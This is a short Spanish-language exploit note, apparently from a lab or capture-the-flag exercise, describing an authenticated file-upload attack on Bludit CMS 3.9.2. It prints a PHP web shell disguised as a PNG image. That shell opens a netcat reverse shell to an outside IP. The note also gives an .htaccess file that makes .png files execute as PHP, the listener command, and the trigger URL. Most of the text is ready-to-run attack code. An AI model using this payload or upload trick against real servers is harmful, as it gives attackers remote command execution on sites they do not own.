** # Bludit 3.9.2 - Directory Traversal**
https://www.exploit-db.com/exploits/48701

Exploit sobre el CMS Bludit estando autenticado en el servicio. Este exploit se basa en subir un par de ficheros al servidor:
* evil.png --> 
``` php
<?php
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.159 443 >/tmp/f");
?>
```

* .htaccess --> 
```
RewriteEngine off
AddType application/x-httpd-php .png
```

El exploit subirá estos dos archivos al servidor. Debemos poner un listener --> `nc -nlvp 443`
Acceder a la ruta donde se suben los ficheros png --> `http://10.10.10.191/bl-content/tmp/temp/evil.png`
Conseguiremos una reverse shell.

================================================================


